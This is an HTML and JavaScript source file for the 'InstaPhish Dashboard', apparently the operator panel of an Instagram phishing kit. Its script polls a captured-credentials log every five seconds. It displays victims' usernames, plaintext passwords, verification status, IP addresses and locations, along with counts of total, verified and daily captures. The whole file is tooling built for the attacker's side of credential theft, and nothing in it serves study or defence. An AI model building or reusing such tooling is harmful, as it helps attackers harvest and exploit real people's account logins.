<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaPhish - Live Dashboard</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --card-bg: #111111;
            --text: #e0e0e0;
            --accent: #0095f6;
            --success: #00c853;
            --error: #ff1744;
            --border: #222222;
            --dim: #666666;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 1px solid var(--border);
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: var(--accent);
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .header .subtitle {
            color: var(--dim);
            font-size: 12px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: var(--accent);
        }
        
        .stat-label {
            font-size: 12px;
            color: var(--dim);
            margin-top: 5px;
        }
        
        .log-container {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .log-header {
            background: #1a1a1a;
            padding: 10px 15px;
            border-bottom: 1px solid var(--border);
            font-size: 14px;
            font-weight: bold;
        }
        
        .log-entries {
            max-height: 500px;
            overflow-y: auto;
            padding: 10px;
        }
        
        .log-entry {
            background: #0d0d0d;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 12px;
            margin-bottom: 10px;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .log-entry .cred {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }
        
        .log-entry .username {
            color: #00bcd4;
            font-weight: bold;
        }
        
        .log-entry .password {
            color: #e91e63;
        }
        
        .log-entry .meta {
            font-size: 11px;
            color: var(--dim);
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .verified-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 10px;
            font-weight: bold;
        }
        
        .verified-yes {
            background: var(--success);
            color: #000;
        }
        
        .verified-no {
            background: var(--error);
            color: #fff;
        }
        
        .refresh-btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-family: inherit;
            margin-left: 10px;
        }
        
        .refresh-btn:hover {
            opacity: 0.8;
        }
        
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--dim);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>InstaPhish Dashboard</h1>
        <p class="subtitle">Live Credential Monitor | Author: r4tur1</p>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value" id="totalCount">0</div>
            <div class="stat-label">Total Captures</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="verifiedCount">0</div>
            <div class="stat-label">Verified</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="todayCount">0</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-card">
            <div class="stat-value" id="uniqueIPs">0</div>
            <div class="stat-label">Unique IPs</div>
        </div>
    </div>
    
    <div class="log-container">
        <div class="log-header">
            📋 Live Capture Feed
            <button class="refresh-btn" onclick="fetchLogs()">Refresh</button>
        </div>
        <div class="log-entries" id="logEntries">
            <div class="empty-state">Waiting for credentials...</div>
        </div>
    </div>
    
    <script>
        async function fetchLogs() {
            try {
                const response = await fetch('../logs/credentials.txt');
                if (!response.ok) {
                    document.getElementById('logEntries').innerHTML = 
                        '<div class="empty-state">No credentials yet. Waiting for captures...</div>';
                    return;
                }
                
                const text = await response.text();
                const entries = text.split('============================================================');
                
                let validEntries = entries.filter(e => e.trim().length > 0);
                let total = 0;
                let verified = 0;
                let today = 0;
                let ips = new Set();
                
                const todayStr = new Date().toISOString().split('T')[0];
                
                let html = '';
                
                validEntries.reverse().forEach(entry => {
                    const lines = entry.trim().split('\n');
                    let username = '';
                    let password = '';
                    let verifiedStr = 'NO';
                    let timestamp = '';
                    let ip = '';
                    let location = '';
                    
                    lines.forEach(line => {
                        if (line.startsWith('USERNAME:')) username = line.replace('USERNAME:', '').trim();
                        if (line.startsWith('PASSWORD:')) password = line.replace('PASSWORD:', '').trim();
                        if (line.startsWith('VERIFIED:')) verifiedStr = line.replace('VERIFIED:', '').trim();
                        if (line.startsWith('TIMESTAMP:')) timestamp = line.replace('TIMESTAMP:', '').trim();
                        if (line.startsWith('IP:')) ip = line.replace('IP:', '').trim();
                        if (line.startsWith('LOCATION:')) location = line.replace('LOCATION:', '').trim();
                    });
                    
                    if (username && password) {
                        total++;
                        if (verifiedStr === 'YES') verified++;
                        if (timestamp && timestamp.startsWith(todayStr)) today++;
                        if (ip) ips.add(ip.split(' ')[0]);
                        
                        html += `
                            <div class="log-entry">
                                <div class="cred">
                                    <span class="username">👤 ${escapeHtml(username)}</span>
                                    <span class="verified-badge ${verifiedStr === 'YES' ? 'verified-yes' : 'verified-no'}">
                                        ${verifiedStr === 'YES' ? '✓' : '✗'} ${verifiedStr}
                                    </span>
                                </div>
                                <div class="cred">
                                    <span class="password">🔑 ${escapeHtml(password)}</span>
                                </div>
                                <div class="meta">
                                    <span>🕐 ${escapeHtml(timestamp)}</span>
                                    <span>🌐 ${escapeHtml(ip)}</span>
                                    ${location ? `<span>📍 ${escapeHtml(location)}</span>` : ''}
                                </div>
                            </div>
                        `;
                    }
                });
                
                document.getElementById('logEntries').innerHTML = html || 
                    '<div class="empty-state">No credentials yet. Waiting for captures...</div>';
                
                document.getElementById('totalCount').textContent = total;
                document.getElementById('verifiedCount').textContent = verified;
                document.getElementById('todayCount').textContent = today;
                document.getElementById('uniqueIPs').textContent = ips.size;
                
            } catch (error) {
                console.error('Fetch error:', error);
            }
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Auto-refresh every 5 seconds
        setInterval(fetchLogs, 5000);
        fetchLogs();
    </script>
</body>
</html>
